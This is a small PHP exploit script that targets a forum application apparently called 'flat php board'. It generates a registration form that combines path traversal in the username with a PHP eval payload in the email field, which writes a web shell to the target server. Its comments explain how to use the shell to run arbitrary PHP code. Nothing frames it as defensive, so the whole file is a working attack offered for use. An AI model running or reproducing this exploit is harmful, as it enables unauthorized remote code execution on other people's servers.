<?
//Usage: 31337.php?targ=http://[target]/[flat_php_board_path]
$targ = $_GET['targ'];
echo '
<form action=index.php method=post>
<input type=hidden name="username" value="../31337">
<input type=hidden name=a value=register2>
<input name="password" type=hidden value="r0x">
<input name="password2" type=hidden value="r0x">
<input name="email" value="<?eval(html_entity_decode(stripslashes($_GET
[r0x])));?>">
<input type=submit value="Exploit!">
</form>';
/*
This will make a shell in http://[target]/[flat_php_board_path]/31337.php
Usage: http://[target]/[flat_php_board_path]/31337.php?r0x=[php_code]
*/
?>